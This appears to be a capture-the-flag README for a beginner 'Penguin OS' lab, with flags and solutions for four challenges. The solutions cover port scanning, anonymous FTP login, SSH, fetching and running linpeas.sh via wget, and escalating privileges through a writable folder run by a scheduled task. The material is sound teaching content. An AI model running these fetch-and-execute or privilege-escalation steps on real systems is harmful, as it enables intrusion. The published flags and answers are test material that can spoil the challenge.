# Challenge

**Multi Challenge:** `True`
**Ports Open:** 20,22,2121

---

# Challenge 1

**Name:** Penguin OS: For the FTP

**Category:** Computers and Networks

**Difficulty:** Easy

**Flag:** `UWA{fTpLipP3r5}`

## Description

Mumble has made a *Penguin OS* server that all penguins can use. He placed the shared credentials for all penguins on a **FTP server** that has **Anonymous login enabled**. However, Mumble does not want pesky humans to be able to connect and corrupt his glorious server. So he did something sneaky **changed the port of the FTP server**.

Can you find the password for the the shared account on the FTP server?

## Hint

You will need to use `nmap` to do a port scan. Use the `-Pn` option if you are having issues doing the port scan.

## Solution

Run `nmap` to scan the server.

```
nmap -sC -Pn 10.10.10.10
```

Connect to the FTP server.

```
ftp -P 2121 10.10.10.10
```

Login using the `Anonymous` account and download the `note-to-flipper-pals.txt` file by using the FTP `get` command.

---

# Challenge 2

**Name:** Penguin OS: Sea Shells

**Category:** Computers and Networks

**Difficulty:** Easy

**Flag:** `UWA{sEcure_S3a_sH3lLs_bI_tH3_sEa_sH04e}`

## Description

Use `ssh` to gain access to the server. The flag is located at `/home/penguinusr/flag2.txt`.

## Solution

Legit just use `ssh` to connect to the server as `penguinusr`.

---

# Challenge 3

**Name:** Penguin OS: Peas in a Pod

**Category:** Computers and Networks

**Difficulty:** Medium

**Flag:** `UWA{d0Nt_pVt_s3Ns1TiV3_d4t4_iN_l000000g5}`

## Description

Now that you have access to the server, use the [`linpeas.sh`](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh) enumeration tool from [PEASS-ng](https://github.com/carlospolop/PEASS-ng) to see if you can find a *password* for the account named `alex`.

## Hint

The task for this challenge is to figure out a way to get `linpeas.sh` onto the server. Maybe there is a *tool* for downloading files that is on the Linux server?

## Solution

Students can use `wget` to download linpeas. However, to download the file they need to be in the `/tmp` folder to have write access.

```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

Once the file is downloaded, first set it to be executable `chmod +x linpeas.sh` and execute it. `linpeas.sh` will find the password for the account `alex` in a log file in `/var/log/supervisor/fixpasswords.log`.

---

# Challenge 4

**Name:** Penguin OS: Scheduled Hack

**Category:** Computers and Networks

**Difficulty:** Hard

**Flag:** `UWA{d0Nt_g0oF_y0_sCh3dUl3d_t4sK5}`

---

## Description

`mumble` left a passive aggressive note to `alex` that can be read at `/home/alex/note-to-alex.txt`.

*Try and figure out a way to execute commands as `mumble` and read the final flag at `/home/mumble/flag4.txt`.*

---

## Hint

The source code of the scheduled task is located at `/home/mumble/execute-scripts.sh`.

**`alex` can write files in `/opt/admin-scripts`!**

---

## Solution

As the note explains, there is a scheduled task that executes all script files in `/opt/admin-scripts` using the `mumble` account. This allows you to execute any commands as the `mumble` account!

For an example, the following script will print the flag and the output will be saved in `/opt/admin-scripts-output` folder.

```bash
#!/bin/bash

cat /home/mumble/flag4.txt
```

Set the file to executable and copy into `/opt/admin-scripts` and wait until the scheduled task is triggered.

---

## How to run locally

Run the `bash` script in `challenge` named `start_docker.sh`.